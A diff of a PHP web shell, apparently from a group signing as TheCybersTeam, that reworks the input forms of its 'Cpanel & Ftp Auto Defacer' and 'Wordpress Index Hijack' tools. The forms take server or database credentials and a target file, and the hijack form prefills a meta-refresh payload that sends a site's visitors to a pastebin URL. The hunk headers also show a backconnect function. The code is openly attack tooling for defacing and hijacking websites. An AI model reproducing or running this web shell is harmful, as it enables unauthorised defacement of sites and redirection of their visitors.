@@ -1080,24 +1080,20 @@ function backconnect()
 
 function cpanel()
 {
-echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great">Cpanel & Ftp Auto Defacer</span><br>TheCybersTeam</center><br><center><img src="http://i.imgur.com/50bOEFV.png" /></center>';
-echo"<table width='100%' cellspacing='0' cellpadding='0' class='tb1' >
-<td width='100%' align=center valign='top' rowspan='1'><div class='hedr'> 
-<td height='10' align='left' class='td1'></td></tr><tr><td 
-width='100%' align='center' valign='top' rowspan='1'>
-<font color='red' face='comic sans ms' size='1'><b> 
-<font color='RED' face='gothic' size='3'></font><br>
-<font color='white'></font>
-</table>";
- 
-echo"<body bgcolor=black><h6 style='text-align:center'><font color=white>
-<form method=post><font face=Tahoma size=2 color=#007700>
-Server ip : &nbsp;<input type=text name=hi value=ip>&nbsp;
-Username : &nbsp;<input type=text name=tx value=>&nbsp;
-Password : &nbsp;<input type=text name=p value=><br><br>
-file that you want to deface : </font><input type=text name=ph value='index.php'><br><br>
-<font face=Tahoma size=2>Deface page url --> </font><textarea class='area' rows='1' cols='75' name='deface' value='your daface page link'></textarea><br><br>
-<input type=submit name=sm value='pwned' /><br>
+
+echo 
+"
+<form method=post>
+<center>
+	<h2>Cpanel & Ftp Auto Defacer</h2>
+
+	Server ip: <input type=text name=hi value=ip>
+	Username: <input type=text name=tx value=>
+	Password: <input type=text name=p value=><br /><br />
+	file that you want to deface :<input type=text name=ph value='index.php'><br /><br />
+	Deface page url --> <textarea class='area' rows='1' cols='75' name='deface' value='your daface page link'></textarea><br /><br />
+	<input type=submit name=sm value='pwned' />
+</center>
 </form>";
 
 if(isset($_POST['sm']))
@@ -1140,19 +1136,25 @@ echo "try manually :(";
 
 function hijack()
 {
-echo '<form method="POST">
-<br><center><span style="font-size:30px; font-family:Fredericka the Great">Wordpress Index Hijack Priv8</span></center><br>
-<p align="center"> 
-<img src="http://i.imgur.com/50bOEFV.png" /></p>
 
-<br><center><font color="#FF0000" size="2" face="orion">TheCybersTeam</font></center><br>
-<center><input type="text" value="localhost" name="pghost">
-<input type="text" value="database_name" name="dbnmn">
-<input type="text" value="prefix" name="prefix">
-<input type="text" value="username_db" name="dbusrrrr">
-<input type="text" value="password_db" name="pwddbbn"></center><br>
-<center><textarea class="area" name="pown" cols="100" rows="7"><meta http-equiv="refresh" content="0;URL=http://pastebin.com/raw/z2vdCWmb"></textarea><br><br>
-<input type="submit" name="up2" value="Hijack Index"><br></center><form>';
+
+
+echo 
+"
+<form method=post>
+<center>
+	<h2>Wordpress Index Hijack Priv8</h2>
+	<input type='text' value='localhost' name='pghost'>
+	<input type='text' value='database_name' name='dbnmn'>
+	<input type='text' value='prefix' name='prefix'>
+	<input type='text' value='username_db' name='dbusrrrr'>
+	<input type='text' value='password_db' name='pwddbbn'>
+	<input type='submit' name='up2' value='Hijack Index'><br />
+	<textarea class='area' name='pown' cols='100' rows='7'><meta http-equiv='refresh' content='0;URL=http://pastebin.com/raw/z2vdCWmb'></textarea>
+</center>
+</form>";
+
+
 $pghost = $_POST['pghost'];
 $dbnmn = $_POST['dbnmn'];
 $dbusrrrr = $_POST['dbusrrrr'];
